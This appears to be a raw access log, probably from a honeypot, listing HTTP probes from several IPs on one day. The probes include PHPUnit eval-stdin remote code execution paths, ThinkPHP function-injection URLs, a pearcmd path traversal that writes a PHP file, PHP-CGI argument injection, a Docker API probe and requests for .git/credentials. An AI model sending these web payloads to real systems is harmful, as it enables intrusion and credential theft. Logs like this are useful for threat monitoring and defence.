"2026-03-20","217.154.69.208","Germany","HTTP","/cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"2026-03-20","217.154.69.208","Germany","HTTP","/crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"2026-03-20","217.154.69.208","Germany","HTTP","/admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"2026-03-20","217.154.69.208","Germany","HTTP","/backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"2026-03-20","217.154.69.208","Germany","HTTP","/blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"2026-03-20","217.154.69.208","Germany","HTTP","/workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"2026-03-20","217.154.69.208","Germany","HTTP","/panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"2026-03-20","217.154.69.208","Germany","HTTP","/public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"2026-03-20","217.154.69.208","Germany","HTTP","/apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"2026-03-20","217.154.69.208","Germany","HTTP","/app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"2026-03-20","217.154.69.208","Germany","HTTP","/index.php?s=/index/\\think\\app/invokefunction\u0026function=call_user_func_array\u0026vars[0]=md5\u0026vars[1][]=Hello"
"2026-03-20","217.154.69.208","Germany","HTTP","/public/index.php?s=/index/\\think\\app/invokefunction\u0026function=call_user_func_array\u0026vars[0]=md5\u0026vars[1][]=Hello"
"2026-03-20","217.154.69.208","Germany","HTTP","/index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd\u0026+config-create+/\u0026/\u003c?echo(md5(\"hi\"));?\u003e+/tmp/index1.php"
"2026-03-20","217.154.69.208","Germany","HTTP","/index.php?lang=../../../../../../../../tmp/index1"
"2026-03-20","217.154.69.208","Germany","HTTP","/containers/json"
"2026-03-20","81.168.83.103","United Kingdom","HTTP","/config.py.bak"
"2026-03-20","195.178.110.246","Bulgaria","HTTP","/.git/credentials"
"2026-03-20","207.166.168.14","Singapore","HTTP","/hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input"
"2026-03-20","207.166.168.14","Singapore","HTTP","/?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input"
"2026-03-20","207.166.168.14","Singapore","HTTP","/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"2026-03-20","207.166.168.14","Singapore","HTTP","/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php"
"2026-03-20","207.166.168.14","Singapore","HTTP","/vendor/phpunit/src/Util/PHP/eval-stdin.php"
"2026-03-20","207.166.168.14","Singapore","HTTP","/vendor/phpunit/Util/PHP/eval-stdin.php"
"2026-03-20","207.166.168.14","Singapore","HTTP","/vendor/phpunit/phpunit/LICENSE/eval-stdin.php"
